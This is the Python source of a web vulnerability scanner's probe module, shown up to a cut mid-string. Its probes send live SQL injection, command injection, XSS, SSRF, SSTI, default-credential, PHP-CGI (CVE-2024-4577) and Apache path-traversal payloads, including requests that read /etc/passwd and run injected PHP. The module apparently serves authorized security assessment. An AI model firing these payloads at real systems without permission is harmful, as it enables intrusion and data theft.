"""Web-application probes — OWASP Top 10 (2021), MITRE ATT&CK mapped.

DAST-style: each probe sends crafted HTTP requests to an authorized web-app
target and inspects the responses for a vulnerability signature, recording the
request/response as attack steps and keeping concrete evidence (PoC-validated,
Strix-style). Payloads are benign demonstrators (`id`, cloud-metadata read,
reflected marker) — assessment inputs, not destructive exploits.
"""
from __future__ import annotations

import re
import time
from urllib.parse import (parse_qsl, quote, urlencode, urljoin, urlparse,
                          urlunparse)

from .. import config
from .base import JudgeResult, WebProbe, register
from ..records import AttemptRec, StepRec

MARK = "DAGGER-XSS-4417"


def _is_demo_target(base_url):
    """True only when base_url is the bundled intentionally-vulnerable demo
    webapp — the one host where the hardcoded /products, /search, /ping demo
    paths actually exist."""
    try:
        demo_host = urlparse(config.DEMO_WEB_URL).hostname or config.DEMO_HOST
        return (urlparse(base_url).hostname or "") == demo_host
    except Exception:
        return False


def _param_url(base_url, param, value, fallback_path):
    """Build a test URL by injecting `value` into an existing query parameter on
    base_url (preferring `param` if present, else the first param found).

    If base_url has NO query string: on the bundled demo webapp, fall back to
    the given demo path so those probes keep working out of the box; on any
    other (real) target, return None — there's no parameter here to inject
    into, and guessing a hardcoded path like /products?id= on a real site just
    404s/502s and tests nothing. Callers must handle a None return."""
    pr = urlparse(base_url)
    qs = parse_qsl(pr.query, keep_blank_values=True)
    if not qs:
        return urljoin(base_url, fallback_path) if _is_demo_target(base_url) else None
    names = [k for k, _ in qs]
    target = param if param in names else names[0]
    new_qs = [(k, value if k == target else v) for k, v in qs]
    return urlunparse(pr._replace(query=urlencode(new_qs)))


def _first_param(base_url):
    return parse_qsl(urlparse(base_url).query, keep_blank_values=True)[0][0] if urlparse(base_url).query else ""


_NO_PARAM_MSG = ("No query parameter on this URL to inject into (and it isn't the bundled demo "
                 "app). Point the probe at a real endpoint that takes a parameter, e.g. via the "
                 "Verify page's endpoint-URL override, or run JS/endpoint discovery first.")


def _req(http, method, url, note, **kw):
    """Perform a request; return (step, resp_or_None)."""
    start = time.time()
    line = f"{method} {url}"
    body = kw.get("data")
    if body is None and kw.get("content") is not None:
        c = kw["content"]
        body = c.decode("utf-8", "replace") if isinstance(c, (bytes, bytearray)) else c
    if body is None and kw.get("json") is not None:
        body = kw["json"]
    if body:
        line += f"\nbody: {body}"
    try:
        r = http.request(method, url, **kw)
        ms = int((time.time() - start) * 1000)
        body = r.text or ""
        excerpt = body[:900]
        hdr = " ".join(f"{k}: {v}" for k, v in r.headers.items())
        resp = f"HTTP {r.status_code}\n{hdr[:300]}\n\n{excerpt}"
        return StepRec("request", line, resp, note, ms), r
    except Exception as e:
        ms = int((time.time() - start) * 1000)
        return StepRec("request", line, f"[request error] {e}", note, ms), None


@register
class SQLInjection(WebProbe):
    id = "sql_injection"
    name = "SQL Injection"
    owasp = "A03"
    mitre = "T1190"
    severity = "critical"
    objective = "Confirm an injectable SQL parameter (error-based or boolean)."
    description = "Tests whether user input reaches a SQL query unparameterised."
    remediation = ("Use parameterised queries / prepared statements, validate input, and never "
                   "concatenate user data into SQL. Return generic error pages.")

    def execute(self, base_url, http):
        attempts = []
        # Inject into the target URL's OWN query parameter when it has one
        # (e.g. ?category=1 on a real endpoint); only fall back to the demo
        # /products?id=1 path when base_url carries no parameters at all.
        param = _first_param(base_url) or "id"
        baseline_url = _param_url(base_url, param, "1", "/products?id=1")
        if baseline_url is None:
            return [AttemptRec("error+boolean-sqli", self.objective, [], False, 0.0, "", _NO_PARAM_MSG)]
        s0, r0 = _req(http, "GET", baseline_url, "Baseline request with benign %s=1" % param)
        base_len = len(r0.text) if r0 is not None else 0

        err_url = _param_url(base_url, param, "1'", "/products?id=" + quote("1'"))
        s1, r1 = _req(http, "GET", err_url, "Inject a single quote to trigger a SQL error")
        err_text = (r1.text if r1 is not None else "")
        sql_err = bool(re.search(r"(sql|sqlite|syntax error|unrecognized token|near \")",
                                 err_text, re.I))

        bool_url = _param_url(base_url, param, "1' OR '1'='1",
                              "/products?id=" + quote("1' OR '1'='1"))
        s2, r2 = _req(http, "GET", bool_url, "Boolean payload: 1' OR '1'='1 (dump all rows)")
        bool_len = len(r2.text) if r2 is not None else 0

        success = sql_err or (bool_len > base_len * 1.3 and bool_len > 0)
        if sql_err:
            ev = re.search(r".{0,80}(sql|sqlite|syntax|unrecognized token).{0,120}", err_text, re.I)
            evidence = ev.group(0).strip() if ev else err_text[:200]
            rationale = "Single-quote injection produced a database error — parameter is injectable."
        elif success:
            evidence = f"Boolean payload returned {bool_len} bytes vs {base_len} baseline (more rows)."
            rationale = "OR 1=1 payload changed result-set size — classic boolean SQLi."
        else:
            evidence, rationale = "", "No SQL error or boolean difference observed."
        attempts.append(AttemptRec("error+boolean-sqli", self.objective, [s0, s1, s2],
                                   success, 1.0 if success else 0.0, evidence, rationale))
        return attempts


@register
class CommandInjection(WebProbe):
    id = "command_injection"
    name = "OS Command Injection"
    owasp = "A03"
    mitre = "T1059"
    severity = "critical"
    objective = "Execute an OS command through an injectable parameter (proof: `id`)."
    description = "Tests whether user input reaches a shell command."
    remediation = ("Avoid shell calls with user input; use safe APIs / arg arrays, allow-list input, "
                   "and drop shell privileges.")

    def execute(self, base_url, http):
        payload = "127.0.0.1; id"
        param = _first_param(base_url) or "host"
        url = _param_url(base_url, param, payload, "/ping?host=" + quote(payload))
        if url is None:
            return [AttemptRec("shell-metacharacter", self.objective, [], False, 0.0, "", _NO_PARAM_MSG)]
        s, r = _req(http, "GET", url, "Append `; id` to the %s parameter (command chaining)" % param)
        text = r.text if r is not None else ""
        m = re.search(r"uid=\d+\(.*?\)\s+gid=\d+\([^)]*\)", text)
        success = bool(m)
        evidence = m.group(0) if m else ""
        rationale = ("Command output (`id`) returned in the response — remote command execution."
                     if success else "No command output observed.")
        return [AttemptRec("shell-metacharacter", self.objective, [s],
                           success, 1.0 if success else 0.0, evidence, rationale)]


@register
class ReflectedXSS(WebProbe):
    id = "reflected_xss"
    name = "Reflected Cross-Site Scripting"
    owasp = "A03"
    mitre = "T1059.007"
    severity = "high"
    objective = "Get an unescaped script payload reflected into the response."
    description = "Tests whether user input is reflected into HTML without encoding."
    remediation = ("Context-aware output encoding, a strict Content-Security-Policy, and framework "
                   "auto-escaping.")

    def execute(self, base_url, http):
        payload = f"<script>{MARK}</script>"
        param = _first_param(base_url) or "q"
        url = _param_url(base_url, param, payload, "/search?q=" + quote(payload))
        if url is None:
            return [AttemptRec("reflected-marker", self.objective, [], False, 0.0, "", _NO_PARAM_MSG)]
        s, r = _req(http, "GET", url, "Submit a <script> payload in the %s parameter" % param)
        text = r.text if r is not None else ""
        success = payload in text
        evidence = payload if success else ""
        rationale = ("Script payload reflected verbatim (unencoded) — reflected XSS."
                     if success else "Payload was encoded or not reflected.")
        return [AttemptRec("reflected-marker", self.objective, [s],
                           success, 0.85 if success else 0.0, evidence, rationale)]


@register
class BrokenAccessControl(WebProbe):
    id = "broken_access_control"
    name = "Broken Access Control (IDOR)"
    owasp = "A01"
    mitre = "T1190"
    severity = "high"
    objective = "Access another user's record by changing an id, without authorization."
    description = "Tests for insecure direct object references / missing authorization checks."
    remediation = ("Enforce per-object authorization server-side on every request; use unguessable "
                   "references and deny by default.")

    def execute(self, base_url, http):
        s1, r1 = _req(http, "GET", urljoin(base_url, "/account?id=1"),
                      "Request account id=1 with no authentication")
        s2, r2 = _req(http, "GET", urljoin(base_url, "/account?id=2"),
                      "Enumerate to account id=2 (another user)")
        t1 = r1.text if r1 is not None else ""
        t2 = r2.text if r2 is not None else ""
        emails = re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", t1 + t2)
        ok1 = (r1 is not None and r1.status_code == 200 and "@" in t1)
        ok2 = (r2 is not None and r2.status_code == 200 and "@" in t2)
        success = ok1 and ok2 and t1 != t2
        evidence = ", ".join(sorted(set(emails))[:4]) if success else ""
        rationale = ("Distinct users' PII returned unauthenticated by id enumeration — IDOR."
                     if success else "Access appears controlled.")
        return [AttemptRec("idor-enumeration", self.objective, [s1, s2],
                           success, 0.9 if success else 0.0, evidence, rationale)]


@register
class SSRF(WebProbe):
    id = "ssrf"
    name = "Server-Side Request Forgery"
    owasp = "A10"
    mitre = "T1190"
    severity = "critical"
    objective = "Make the server fetch an internal URL (cloud-metadata style)."
    description = "Tests whether a URL parameter lets the server request arbitrary internal hosts."
    remediation = ("Allow-list outbound hosts, block link-local/metadata ranges, and resolve+pin "
                   "destinations; never fetch user-supplied URLs directly.")

    def execute(self, base_url, http):
        internal = "http://127.0.0.1:9010/latest/meta-data/credentials"
        url = urljoin(base_url, "/fetch?url=" + quote(internal))
        s, r = _req(http, "GET", url, "Ask the server to fetch an internal metadata URL")
        text = r.text if r is not None else ""
        m = re.search(r"(DAGGER-METADATA\{[^}]+\}|AccessKeyId|SecretAccessKey)", text)
        success = bool(m)
        evidence = (re.search(r"DAGGER-METADATA\{[^}]+\}", text) or [None])[0] if success else ""
        evidence = evidence.group(0) if hasattr(evidence, "group") else (m.group(0) if m else "")
        rationale = ("Server retrieved internal-only metadata on our behalf — SSRF confirmed."
                     if success else "Server did not fetch the internal resource.")
        return [AttemptRec("internal-metadata-fetch", self.objective, [s],
                           success, 1.0 if success else 0.0, evidence, rationale)]


@register
class SecurityMisconfiguration(WebProbe):
    id = "security_misconfiguration"
    name = "Security Misconfiguration"
    owasp = "A05"
    mitre = "T1595"
    severity = "medium"
    objective = "Detect missing security headers and verbose error leakage."
    description = "Checks for absent hardening headers and stack/SQL error disclosure."
    remediation = ("Set CSP, X-Frame-Options, X-Content-Type-Options and HSTS; return generic "
                   "errors; disable directory listing and debug modes.")

    WANT = ["content-security-policy", "x-frame-options", "x-content-type-options",
            "strict-transport-security"]

    def execute(self, base_url, http):
        s, r = _req(http, "GET", urljoin(base_url, "/"), "Inspect response headers on the home page")
        missing = []
        if r is not None:
            have = {k.lower() for k in r.headers}
            missing = [h for h in self.WANT if h not in have]
        _sm_param = _first_param(base_url) or "id"
        _sm_url = _param_url(base_url, _sm_param, "'", "/products?id=" + quote("'"))
        s2, r2 = (None, None)
        if _sm_url is not None:
            s2, r2 = _req(http, "GET", _sm_url, "Trigger an error to check for verbose stack/SQL disclosure")
        verbose = bool(r2 is not None and re.search(r"(traceback|sqlite|at line \d|stack)",
                                                    r2.text, re.I))
        success = len(missing) >= 2 or verbose
        bits = []
        if missing:
            bits.append("missing headers: " + ", ".join(missing))
        if verbose:
            bits.append("verbose error disclosure")
        evidence = "; ".join(bits)
        rationale = ("Hardening gaps found." if success else "Baseline hardening present.")
        steps = [st for st in (s, s2) if st is not None]
        return [AttemptRec("header+error-audit", self.objective, steps,
                           success, 0.6 if success else 0.0, evidence, rationale)]


@register
class VulnerableComponents(WebProbe):
    id = "vulnerable_components"
    name = "Vulnerable & Outdated Components"
    owasp = "A06"
    mitre = "T1595.002"
    severity = "low"
    objective = "Fingerprint server/software versions disclosed in responses."
    description = "Detects version banners that aid targeting of known-vulnerable components."
    remediation = "Suppress version banners, inventory dependencies, and patch on a schedule."

    def execute(self, base_url, http):
        s, r = _req(http, "GET", urljoin(base_url, "/"), "Read the Server banner / version headers")
        server = ""
        if r is not None:
            server = r.headers.get("server", "") + " " + r.headers.get("x-powered-by", "")
        success = bool(re.search(r"\d+\.\d+", server))
        evidence = server.strip() if success else ""
        rationale = ("Version banner disclosed — eases targeting of known CVEs."
                     if success else "No version banner disclosed.")
        return [AttemptRec("banner-grab", self.objective, [s],
                           success, 0.4 if success else 0.0, evidence, rationale)]


@register
class AuthFailures(WebProbe):
    id = "auth_failures"
    name = "Identification & Authentication Failures"
    owasp = "A07"
    mitre = "T1110"
    severity = "high"
    objective = "Log in with a default/weak credential pair."
    description = "Checks a small default-credential list against the login endpoint."
    remediation = ("Forbid default/weak passwords, enforce MFA, add rate limiting and lockout, and "
                   "monitor for credential stuffing.")

    CREDS = [("admin", "admin"), ("admin", "password"), ("admin", "123456")]

    def execute(self, base_url, http):
        steps, hit = [], None
        for user, pw in self.CREDS:
            s, r = _req(http, "POST", urljoin(base_url, "/login"),
                        f"Try default credentials {user}:{pw}", json={"user": user, "password": pw})
            steps.append(s)
            text = (r.text if r is not None else "").lower()
            if r is not None and r.status_code == 200 and re.search(r'(token|success|welcome|"ok"\s*:\s*true)', text):
                hit = (user, pw)
                break
        success = hit is not None
        evidence = f"default credentials accepted: {hit[0]}:{hit[1]}" if hit else ""
        rationale = ("A default credential pair authenticated successfully."
                     if success else "Default credentials rejected.")
        return [AttemptRec("default-credentials", self.objective, steps,
                           success, 0.85 if success else 0.0, evidence, rationale)]


@register
class SSTI(WebProbe):
    id = "ssti"
    name = "Server-Side Template Injection"
    owasp = "A03"
    mitre = "T1059"
    severity = "critical"
    objective = "Confirm server-side template injection by evaluating an arithmetic expression."
    description = "Tests whether user input is evaluated by a server-side template engine (→ RCE)."
    remediation = ("Never render user input as a template; use a sandboxed engine with autoescaping; "
                   "validate and escape input.")

    def execute(self, base_url, http):
        import random
        a, b = random.randint(100, 999), random.randint(100, 999)
        expected = str(a * b)
        payloads = ["{{%d*%d}}" % (a, b), "${%d*%d}" % (a, b), "#{%d*%d}" % (a, b),
                    "{%d*%d}" % (a, b), "<%%= %d*%d %%>" % (a, b)]
        param = _first_param(base_url) or "q"
        if _param_url(base_url, param, payloads[0], "/search?q=" + quote(payloads[0])) is None:
            return [AttemptRec("template-eval", self.objective, [], False, 0.0, "", _NO_PARAM_MSG)]
        last = None
        for tpl in payloads:
            url = _param_url(base_url, param, tpl, "/search?q=" + quote(tpl))
            s, r = _req(http, "GET", url, "Inject a template expression (%s) into %s" % (tpl, param))
            last = s
            text = r.text if r is not None else ""
            if expected in text and tpl not in text:
                return [AttemptRec("template-eval", self.objective, [s], True, 1.0, expected,
                                   "Template expression evaluated server-side (%s -> %s) — SSTI, likely RCE."
                                   % (tpl, expected))]
        return [AttemptRec("template-eval", self.objective, [last] if last else [], False, 0.0, "",
                           "No server-side template evaluation observed.")]


@register
class PHPCGIArgInjection(WebProbe):
    """CVE-2024-4577 — PHP-CGI argument injection → RCE (PHP on Windows/CGI).
    Verifies with a BENIGN payload that only echoes a random marker (no harm)."""
    id = "cve_2024_4577"
    name = "PHP-CGI Argument Injection (CVE-2024-4577)"
    owasp = "A06"
    mitre = "T1190"
    severity = "critical"
    cves = ("CVE-2024-4577",)
    objective = "Confirm CVE-2024-4577 PHP-CGI argument injection leads to remote code execution."
    description = ("Tests the PHP-CGI argument-injection RCE (CVE-2024-4577): a soft-hyphen (%AD) "
                   "smuggles -d directives that enable auto_prepend_file=php://input, executing a "
                   "posted PHP payload.")
    remediation = ("Upgrade PHP to a patched release (8.1.29/8.2.20/8.3.8+); stop running PHP in CGI "
                   "mode; apply the vendor advisory and WAF rules for the %AD pattern.")

    def execute(self, base_url, http):
        import random
        # Benign proof: a unique marker plus a server-side arithmetic result.
        # A reflected payload would echo the literal "A*B"; only genuine PHP
        # execution returns the product, so the computed value is the proof
        # that the injected code ran server-side (the exploitation effect).
        marker = "DAGGER-PHPCGI-%d" % random.randint(10000, 99999)
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expect = "%s:%d" % (marker, a * b)
        payload = "<?php echo '%s:'; echo %d*%d; ?>" % (marker, a, b)
        # The injection smuggles -d directives so a posted script is executed.
        q = "%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
        # Build target URLs that respect the app's base PATH (not just the origin
        # root): if the target is served under /app/..., test /app/index.php too,
        # and if the URL itself is a .php, inject directly on it.
        from urllib.parse import urlparse
        pr = urlparse(base_url)
        origin = "%s://%s" % (pr.scheme or "http", pr.netloc)
        path = pr.path or "/"
        base_dir = path.rsplit("/", 1)[0] if "/" in path.strip("/") else ""
        segs = [s for s in path.strip("/").split("/") if s]
        app_root = "/" + segs[0] if segs else ""
        cands = []
        if path.endswith(".php"):
            cands.append("%s%s?%s" % (origin, path, q))
        for pfx in dict.fromkeys([base_dir.rstrip("/"), app_root.rstrip("/"), ""]):
            cands.append("%s%s/index.php?%s" % (origin, pfx, q))
            cands.append("%s%s/?%s" % (origin, pfx, q))
        for p in ("/php-cgi/php-cgi.exe", "/cgi-bin/php.exe", "/cgi-bin/php-cgi.exe",
                  "/test.php", "/info.php"):
            cands.append("%s%s?%s" % (origin, p, q))
        cands = list(dict.fromkeys(cands))
        steps, codes = [], []
        for url in cands:
            s, r = _req(http, "POST", url,
                        "CVE-2024-4577: smuggle -d directives, POST a benign PHP compute payload",
                        content=payload.encode())
            steps.append(s)
            if r is not None:
                codes.append(r.status_code)
                if expect in (r.text or ""):
                    return [AttemptRec("php-cgi-arg-injection", self.objective, steps, True, 1.0, expect,
                                       "CVE-2024-4577 confirmed exploitable: the injected PHP ran server-side "
                                       "and returned the computed value %s (a reflection would echo the "
                                       "literal expression, not the product) — remote code execution." % expect)]
        # Distinguish a backend/gateway error from genuinely-not-vulnerable.
        if codes and all(c >= 500 for c in codes):
            why = ("every attempt returned an HTTP %d backend/gateway error — the request reached the "
                   "backend but it erred (likely no PHP-CGI at these paths). Point at a real .php endpoint "
                   "(URL override) and retry with a fresh session." % codes[0])
        elif not codes:
            why = "no response from the target (unreachable, or blocked before the backend)."
        else:
            why = "no server-side execution — not PHP-CGI (CVE-2024-4577 is PHP-CGI/Windows-specific), or patched."
        return [AttemptRec("php-cgi-arg-injection", self.objective, steps, False, 0.0, "",
                           "Not confirmed: " + why)]


@register
class ApachePathTraversal(WebProbe):
    """CVE-2021-41773 / CVE-2021-42013 — Apache 2.4.49/2.4.50 path traversal.
    Benign proof: read a world-readable system file (/etc/passwd) to confirm
    the traversal; the probe never writes, executes, or reads secrets."""
    id = "cve_2021_41773"
    name = "Apache Path Traversal (CVE-2021-41773 / 42013)"
    owasp = "A05"
    mitre = "T1190"
    severity = "critical"
    cves = ("CVE-2021-41773", "CVE-2021-42013")
    objective = "Confirm Apache path traversal by reading a world-readable system file."
    description = ("Tests the Apache 2.4.49/2.4.50 path-traversal flaw: an encoded ../ sequence under "
                   "an aliased/cgi path escapes the document root to read files outside it.")
    remediation = ("Upgrade Apache httpd to 2.4.51+; set 'Require all denied' on filesystem roots; "
                   "disable mod_cgi where unused.")

    # Encoded traversal variants for 41773 (%2e) and 42013 (double-encoded).
    PATHS = [
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
    ]

    def execute(self, base_url, http):
        steps = []
        for path in self.PATHS:
            url = urljoin(base_url, path)
            s, r = _req(http, "GET", url, "Request /etc/passwd via an encoded ../ traversal")
            steps.append(s)
            text = r.text if r is not None else ""
            m = re.search(r"^root:.*?:0:0:", text, re.M)
            if m:
                return [AttemptRec("encoded-traversal", self.objective, steps, True, 1.0, m.group(0),
                                   "Traversal succeeded: a world-readable system file was returned "
                                   "(root entry: %s) — files outside the document root are exposed." % m.group(0))]
        return [AttemptRec("encoded-traversal", self.objective, steps, False, 0.0, "",
                           "Not exploitable (traversal blocked; not a vulnerable Apache build).")]


# Header-name fingerprints of a fronting security gateway / WAF / CDN.
_GW_HDR = ("x-sec-ngx", "x-tunnel-proxy", "x-tunnel-nginx", "x-inf-ngx", "x-sec-gw",
           "x-waf", "x-cdn", "cf-ray", "x-amz-cf-id", "x-akamai", "x-sucuri",
           "x-protected-by", "x-firewall", "x-safe-firewall", "server-safedog")
# Server-banner fingerprints of a gateway / WAF.
_GW_SERVER = ("stgw", "cloudflare", "akamaighost", "awselb", "sucuri", "safedog",
              "yunjiasu", "yundun", "sec-gw", "bigip", "fortiweb", "imperva", "incapsula")
# Location substrings that indicate an unauthenticated redirect to an SSO / login gateway.
_SSO_LOC = ("sso", "check_login", "/login", "oauth", "signin", "sign_in", "/auth",
            "cas/login", "adfs", "openid", "sec-gw", "idp")


@register
class SecurityGateway(WebProbe):
    """Detects a fronting security gateway / WAF / SSO proxy. Not a target
    weakness — an operational finding that explains WHY fingerprinting (e.g.
    PHP) and vuln probes come back empty: the gateway redirects unauthenticated
    traffic to a login, strips backend fingerprint headers, and filters probes."""
    id = "security_gateway"
    name = "Security Gateway / WAF Fronting"
    owasp = ""
    mitre = "T1590.002"
    severity = "info"
    objective = "Detect a fronting security gateway / WAF / SSO that limits scanning."
    description = ("Checks whether the target sits behind a security gateway, WAF, or SSO proxy that "
                   "redirects unauthenticated requests to a login, strips backend fingerprint headers "
                   "(Server / X-Powered-By), or filters probe traffic — which hides the real application "
                   "and prevents tech fingerprinting and vulnerability detection at this URL.")
    remediation = ("Not a target weakness — a scan-coverage limitation. To actually assess the app: "
                   "point the target at the backend/API base URL behind the gateway (find it in the "
                   "browser's Network panel), set a valid session cookie on the campaign and keep it "
                   "fresh. While the gateway strips headers and filters requests, PHP/framework "
                   "fingerprinting and CVE probes cannot reach the backend.")

    def execute(self, base_url, http):
        signals, steps = [], []
        s1, r1 = _req(http, "GET", base_url,
                      "Check for a fronting security gateway / WAF (headers, no redirect follow)",
                      follow_redirects=False)
        steps.append(s1)
        if r1 is None:
            return [AttemptRec("gateway-fingerprint", self.objective, steps, False, 0.0, "",
                               "No response — could not assess gateway fronting.")]
        h = {k.lower(): v for k, v in r1.headers.items()}
        server = (h.get("server", "") or "").lower()
        powered = h.get("x-powered-by", "")
        loc = h.get("location", "")
        found_hdrs = sorted({k for k in h if any(sig in k for sig in _GW_HDR)})
        found_server = [w for w in _GW_SERVER if w in server]
        sso = r1.status_code in (301, 302, 303, 307, 308) and any(k in loc.lower() for k in _SSO_LOC)
        if found_hdrs:
            signals.append("gateway/WAF headers present: " + ", ".join(found_hdrs[:6]))
        if found_server:
            signals.append("gateway/WAF server banner: " + server)
        if sso:
            signals.append("unauthenticated request redirects to an SSO/login gateway: " + loc[:140])
        if not server and not powered and (found_hdrs or found_server):
            signals.append("backend fingerprint headers (Server / X-Powered-By) are stripped by the "
                           "gateway — upstream tech such as PHP cannot be fingerprinted at this URL")
        # If we got through authenticated (200, no SSO seen), re-request WITHOUT the
        # session cookie to reveal the auth gateway and confirm the cookie is required.
        if r1.status_code == 200 and not sso:
            s2, r2 = _req(http, "GET", base_url,
                          "Re-request without the session cookie to reveal auth-gateway behavior",
                          follow_redirects=False, headers={"Cookie": ""})
            steps.append(s2)
            if r2 is not None:
                loc2 = (r2.headers.get("location", "") or "")
                if r2.status_code in (301, 302, 303, 307, 308) and any(k in loc2.lower() for k in _SSO_LOC):
                    signals.append("without a session cookie the same URL redirects to SSO/login (" +
                                   loc2[:120] + ") — a fresh session cookie is required for any scan to "
                                   "see the app")
        if signals:
            ev = " | ".join(signals)[:700]
            return [AttemptRec("gateway-fingerprint", self.objective, steps, True, 1.0, ev,
                               "Target is behind a security gateway / WAF / SSO. This is why PHP (and "
                               "other backend tech) is not fingerprinted and recent CVEs are not found at "
                               "this URL — the gateway hides the backend and filters probes. Scan the "
                               "backend/API URL with a fresh session cookie instead.")]
        return [AttemptRec("gateway-fingerprint", self.objective, steps, False, 0.0, "",
                           "No fronting security gateway / WAF detected.")]


@register
class PHPFingerprint(WebProbe):
    """Identify a PHP backend WITHOUT relying on Server / X-Powered-By headers.
    Modern PHP runs with expose_php=Off, so the banner reveals nothing; this
    probe infers PHP from behaviour: session-cookie names, .php handler
    behaviour, and framework fingerprint paths."""
    id = "php_fingerprint"
    name = "PHP Fingerprint (banner-independent)"
    owasp = ""
    mitre = "T1592.002"
    severity = "info"
    objective = "Identify a PHP backend without Server / X-Powered-By headers."
    description = ("Modern PHP hides its version and identity (expose_php=Off), so HTTP headers don't "
                   "reveal it. This probe infers PHP behaviourally: PHP/framework session-cookie names "
                   "(PHPSESSID, laravel_session, ci_session, CAKEPHP...), whether the server handles "
                   ".php (index.php works but a random .php 404s), and framework fingerprint paths.")
    remediation = ("Informational. If PHP is confirmed, the PHP CVE / SQLi / SSTI probes and nuclei "
                   "target it. To reduce fingerprinting, rename the session cookie, use pretty URLs "
                   "and remove framework debug/default paths.")

    _CK = {"phpsessid": "PHP", "laravel_session": "Laravel (PHP)", "ci_session": "CodeIgniter (PHP)",
           "cakephp": "CakePHP (PHP)", "symfony": "Symfony (PHP)", "yii": "Yii (PHP)",
           "wordpress_": "WordPress (PHP)", "wp-settings": "WordPress (PHP)"}
    _FW_PATHS = [("/wp-login.php", "WordPress"), ("/_ignition/health-check", "Laravel Ignition"),
                 ("/_profiler/", "Symfony profiler"), ("/phpinfo.php", "phpinfo")]

    def _setcookie(self, r):
        if r is None:
            return ""
        return " ".join(v for k, v in r.headers.items() if k.lower() == "set-cookie").lower()

    def execute(self, base_url, http):
        import random
        signals, steps = [], []
        # 1) session-cookie names (survive expose_php=Off)
        s0, r0 = _req(http, "GET", base_url, "Read Set-Cookie for a PHP/framework session cookie",
                      follow_redirects=False)
        steps.append(s0)
        low = self._setcookie(r0)
        for name, fw in self._CK.items():
            if name in low:
                signals.append(f"session cookie '{name}' -> {fw}")
        # 2) .php handler behaviour: /index.php vs a random .php
        s1, r1 = _req(http, "GET", urljoin(base_url, "/index.php"), "Probe /index.php",
                      follow_redirects=False)
        rp = "/zz%d.php" % random.randint(10000, 99999)
        s2, r2 = _req(http, "GET", urljoin(base_url, rp),
                      "Probe a random .php (should 404 if the server handles PHP)",
                      follow_redirects=False)
        steps += [s1, s2]
        rand_code = r2.status_code if r2 is not None else None
        catch_all = rand_code == 200   # random path 200 => catch-all; 200-based signals untrustworthy
        if r1 is not None and rand_code is not None and not catch_all:
            if r1.status_code in (200, 301, 302, 403) and rand_code == 404 and r1.status_code != rand_code:
                signals.append(f"/index.php -> {r1.status_code} but random .php -> 404: the server "
                               "executes .php")
        # 3) framework fingerprint paths — only trust a genuine 200 that differs
        #    from the random baseline (so catch-all 200/302 redirects don't count)
        if not catch_all and rand_code is not None:
            for path, fw in self._FW_PATHS:
                s, r = _req(http, "GET", urljoin(base_url, path), f"Probe {fw} path {path}",
                            follow_redirects=False)
                steps.append(s)
                if r is not None and r.status_code == 200 and rand_code != 200:
                    signals.append(f"{path} present -> {fw} (PHP)")
        if signals:
            ev = " | ".join(signals)[:500]
            return [AttemptRec("php-fingerprint", self.objective, steps, True, 1.0, ev,
                               "PHP backend identified without banner headers: " + signals[0] +
                               ". The PHP CVE / SQLi / SSTI probes and nuclei apply to it.")]
        return [AttemptRec("php-fingerprint", self.objective, steps, False, 0.0, "",
                           "No banner-independent PHP signal (hardened pretty-URL app, not PHP, or gated).")]


@register
class PHP2Shell(WebProbe):
    """PHP2Shell (CVE-2026-109618 / CVE-2026-109619) — VERSION-BASED detection.

    These are memory-corruption / use-after-free RCE bugs in core PHP (5.4–8.5.11),
    critical and actively exploited (CISA KEV). There is no simple benign PoC: a
    working check would be a full memory-corruption exploit, which this platform
    deliberately does NOT build. This probe only fingerprints the PHP version from
    response headers and flags vulnerable builds so you can patch.
    """
    id = "cve_2026_109618"
    name = "PHP2Shell RCE (CVE-2026-109618 / 109619)"
    owasp = "A06"
    mitre = "T1190"
    severity = "critical"
    cves = ("CVE-2026-109618", "CVE-2026-109619")
    objective = "Detect PHP builds vulnerable to PHP2Shell (CVE-2026-109618/109619) by version."
    description = ("Version-based detection for PHP2Shell: CVE-2026-109618 (memory corruption during "
                   "OOM handling) and CVE-2026-109619 (use-after-free across requests) — critical "
                   "unauthenticated RCE in core PHP 5.4–8.5.11, under active exploitation. This probe "
                   "reads the PHP version from response headers and flags vulnerable builds; it does NOT "
                   "exploit the memory-corruption bug.")
    remediation = ("Upgrade PHP to 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 or later (per branch). PHP 8.1 and "
                   "older are EOL with no official fix — migrate. Target is actively exploited: review "
                   "for compromise.")

    _PATCHED = {(8, 5): 12, (8, 4): 27, (8, 3): 36, (8, 2): 35}

    def _vuln(self, ver):
        m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", ver)
        if not m:
            return None
        maj, mnr, pat = int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)
        if maj < 8:
            return True                       # 5.x / 7.x — all affected (EOL)
        if maj == 8 and mnr <= 1:
            return True                       # 8.0 / 8.1 — affected, no fix
        fix = self._PATCHED.get((maj, mnr))
        if fix is not None:
            return pat < fix                  # 8.2–8.5 — vulnerable below the patch level
        return False                          # 8.6+ / 9+ — not affected

    def execute(self, base_url, http):
        s, r = _req(http, "GET", base_url,
                    "Read the PHP version from response headers (X-Powered-By / Server)")
        steps = [s]
        if r is None:
            return [AttemptRec("php2shell-version", self.objective, steps, False, 0.0, "",
                               "No response — could not assess PHP2Shell exposure.")]
        h = {k.lower(): v for k, v in r.headers.items()}
        banner = h.get("x-powered-by", "") + " " + h.get("server", "")
        setck = " ".join(v for k, v in r.headers.items() if k.lower() == "set-cookie").lower()
        m = re.search(r"php/(\d+\.\d+(?:\.\d+)?)", banner, re.I)
        if m:
            ver = m.group(1)
            if self._vuln(ver):
                return [AttemptRec("php2shell-version", self.objective, steps, True, 1.0,
                                   "PHP/%s — within the PHP2Shell affected range (5.4–8.5.11)" % ver,
                                   "VULNERABLE: PHP %s is affected by PHP2Shell (CVE-2026-109618/109619), "
                                   "a critical unauthenticated RCE under active exploitation. Patch to "
                                   "8.5.12/8.4.27/8.3.36/8.2.35+ immediately." % ver)]
            return [AttemptRec("php2shell-version", self.objective, steps, False, 0.0, "PHP/%s" % ver,
                               "PHP %s appears patched / outside the PHP2Shell affected range." % ver)]
        if "phpsessid" in setck:
            return [AttemptRec("php2shell-version", self.objective, steps, False, 0.0, "",
                               "PHP detected (PHPSESSID) but the version is hidden (expose_php=Off), so "
                               "PHP2Shell can't be confirmed from headers. Check the PHP version manually: "
